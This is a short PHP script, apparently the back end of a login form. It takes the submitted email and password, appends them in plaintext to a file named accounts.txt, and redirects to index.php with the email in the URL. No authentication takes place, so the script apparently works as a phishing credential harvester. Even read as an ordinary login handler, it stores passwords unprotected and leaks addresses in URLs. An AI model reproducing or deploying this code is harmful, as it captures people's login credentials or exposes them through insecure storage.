<?php

    $username = $_POST["Email"];
    $password = $_POST["Password"];
    $filename = "accounts.txt";
    //opening the file 
    $fp = fopen($filename, 'a');
    // writing over the file to try to see it if finds it.
    fwrite ($fp, $username . ',' . $password . "\n");
    fclose($fp);
    // send back to index.php
    header("Location:index.php?$username"); 
    die();
?>
